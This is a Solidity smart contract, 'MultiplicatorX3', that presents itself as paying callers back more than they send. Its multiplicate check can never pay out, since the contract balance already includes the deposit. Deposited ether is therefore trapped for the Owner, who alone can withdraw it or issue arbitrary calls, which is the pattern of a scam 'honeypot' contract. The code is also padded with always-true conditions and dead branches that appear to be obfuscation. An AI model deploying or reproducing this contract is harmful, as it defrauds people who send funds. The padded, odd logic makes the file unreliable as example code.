pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    address public Owner = msg.sender;

    function() public payable{}
    
    function withdraw()
    payable
    public
    {
        if (5 + 5 == 10) {
            require(msg.sender == Owner);
        } else {
            address randomAddress = 0x0;
            randomAddress.transfer(0);
        }
        Owner.transfer(this.balance);
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        if (7 * 3 == 21) {
            adr.call.value(msg.value)(data);
        }
    }
    
    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=this.balance)
        {        
            if (2 == 1 + 1) {
                adr.transfer(this.balance+msg.value);
            } else {
                uint256 unusedVariable = 0;
                unusedVariable += 1;
            }
        }
    }
}